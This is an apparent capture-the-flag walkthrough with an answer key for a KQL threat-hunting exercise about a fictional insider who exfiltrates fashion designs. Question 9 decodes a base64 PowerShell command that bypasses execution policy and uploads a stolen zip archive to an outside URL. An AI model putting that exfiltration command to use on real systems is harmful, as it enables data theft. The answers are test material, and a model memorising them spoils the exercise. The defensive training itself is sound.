# Section 3: Cyber Cattle Thief 🐄

## Table of Contents
- [Question 1](#question-1)
- [Question 2](#question-2)
- [Question 3](#question-3)
- [Question 4](#question-4)
- [Question 5](#question-5)
- [Question 6](#question-6)
- [Question 7](#question-7)
- [Question 8](#question-8)
- [Question 9](#question-9)
- [Question 10](#question-10)
- [Question 11](#question-11)
- [Question 12](#question-12)

---

## Question 1

Enter Oh no to continue.

### Answer

`Oh no`

---

## Question 2

You’ve just been hired at Celestial Cowboy Couture and you haven’t even been fully onboarded yet when Director of Happiness, Jason Blanchard, walks in. He’s not his usual upbeat self—he looks worried. Trying to keep a positive face, he says, “I know we’re not exactly known for being great at capitalism, but Celestial Cowboy Couture is counting on you to get to the bottom of this. If we don’t find out how this happened, we could be ruined.”

You got this job thanks to his “How to Hunt for Jobs like a Hacker” series, so you definitely don’t want to let him down.

Enter Saddle up to continue.

### Answer

`Saddle up`

---

## Question 3

While job hunting like a hacker, you went all-in and checked out every employee on LinkedIn. You remember seeing a spicy post from the Lead Fashion Designer, venting about not getting the promotion they were promised. Could a little workplace drama have caused them to leak the secret designs?

What is the name of the Lead Fashion Designer?

### KQL Query

```kql
Employees
| where role == "Lead Fashion Designer"
| project name
```

### Answer

`Megan Lucia`

---

## Question 4

Now that we know the name of the Lead Fashion Designer, let’s take things a step further.

In a suspected insider threat case, it's important to check the activity on the employee’s machine to see if they’ve accessed or created any suspicious files. We can do this by pivoting to the FileCreations table and reviewing the file activity on Megan's device.

Does it look like Megan was up to suspicious activity that needs to be investigated further? (Yes/No)

### KQL Query

```kql
FileCreationEvents
| where hostname == "ITCK-MACHINE"
```

### Notes

- Review the file activity on Megan's machine.
- A suspicious directory named `designs_to_steal` appears in the file paths.

### Answer

`Yes`

---

## Question 5

After discovering suspicious activity on Megan's machine, you start to notice something odd. When cybercriminals or insiders are planning to steal data, they often compress files into a zip format to make them smaller and easier to send out of the network undetected.

How many of these zip files were created on Megan's machine?

### KQL Query

```kql
FileCreationEvents
| where hostname == "ITCK-MACHINE"
| where filename contains ".zip"
```

### Answer

`4`

---

## Question 6

Not only were zip files created, but they were also placed in a suspicious folder with a pretty telling name! 😱

It’s common for attackers to organize the data they’re planning to exfiltrate in a way that’s easy to find.

What folder were the zip files placed in on Megan's machine?

### KQL Query

```kql
FileCreationEvents
| where hostname == "ITCK-MACHINE"
| where filename contains ".zip"
| extend dir = parse_path(path).DirectoryName
```

### Answer

`designs_to_steal`

---

## Question 7

An executable file, advanced-uploader.exe, appears on Megan’s machine after the creation of the zip files. Executable files, or .exe files, are programs that can run on a computer. This could be a tool used to move data out of the network.

What is the timestamp for when this file was created?

### KQL Query

```kql
FileCreationEvents
| where hostname == "ITCK-MACHINE"
| where filename == "advanced-uploader.exe"
| project timestamp
```

### Answer

`10/2/2024, 8:36:47 AM`

---

## Question 8

Now that we’ve identified the suspicious advanced-uploader.exe file, the next step is to check if this file was actually run on Megan’s machine. To do this, we’ll look at the ProcessEvents table, which records all processes that have been executed. If we find evidence of this file being run, it could confirm that it was used to exfiltrate the stolen designs.

Was this process executed on Megan's machine? (Yes/No)

### KQL Query

```kql
ProcessEvents
| where hostname == "ITCK-MACHINE"
| where process_name == "advanced-uploader.exe"
```

### Answer

`Yes`

---

## Question 9

This is not looking good! The advanced-uploader.exe process was executed using an encrypted base64 command. Attackers often encode their commands to hide malicious activity and make it harder to detect.

Luckily, we can use a tool like CyberChef to easily decode base64 and analyze what the command was doing.

What is the full URL where the files were exfiltrated to?

### Notes

**Encoded Command**

```text
QzpcV2luZG93c1xTeXN0ZW0zMlxwb3dlcnNoZWxsLmV4ZSAtTm9wIC1FeGVjdXRpb25Qb2xpY3kgYnlwYXNzIC1Db21tYW5kICIkcmV2ID0gJzMgeXJ0ZXItLSBCTTUgZXppcy1rbnVoYy0tIHRweXJjbmUtLSBuaWhzdXB0aXRlZWthbnRyYXBlcmVodGFrb29sb3RuaWh0b250bmlhL21vYy55cnJlYmVsa2N1aC1ydW95LW1pLy86cHR0aCB0c2VkLS0gcGl6LnRvb2xfZGVvc3NhbFxjaWxidVBcc3Jlc1VcOkMgZWxpZi0tIGV4ZS5yZWRhb2xwdS1kZWNuYXZkYSc7JHJldls6Oi0xXSI
```

### CyberChef Recipe

```text
From Base64
→ Reverse
```

### CyberChef Link

```text
https://gchq.github.io/CyberChef/
```

**Decoded Script**

```text
"]1-::[ver$;'advanced-uploader.exe --file C:\Users\Public\lassoed_loot.zip --dest http://im-your-huckleberry.com/aintnothintolookatherepartnakeetitpushin --encrypt --chunk-size 5MB --retry 3' = ver$" dnammoC- ssapyb yciloPnoitucexE- poN- exe.llehsrewop\23metsyS\swodniW\:C
```

### Answer

`http://im-your-huckleberry.com/aintnothintolookatherepartnakeetitpushin`

---

## Question 10

It sure looks👀 like Megan is guilty, but just as you’re about to wrap up your investigation and call it a day, you get an unexpected message in your Teams chat.

What database table contains evidence of employee logins?

### Answer

`AuthenticationEvents`

---

## Question 11

In Megan’s login history, one of these logins stands out from the others! It contains a different source IP and user-agent. This is called an anomaly and could be the key🔑 to uncovering more about the attack.

Paste the timestamp for when that anomalous login occurred.

### KQL Query

```kql
AuthenticationEvents
| where username == "melucia"
| where result contains "success"
```

### Notes

- Review successful logins for Megan's account.
- Identify the login event with a different `src_ip` and `user_agent`.

### Answer

`9/23/2024, 6:58:54 AM`

---

## Question 12

What is the source IP used for that login?

### Notes

- Identified from the anomalous login discovered in Question 11.

### Answer

`192.124.249.15`

---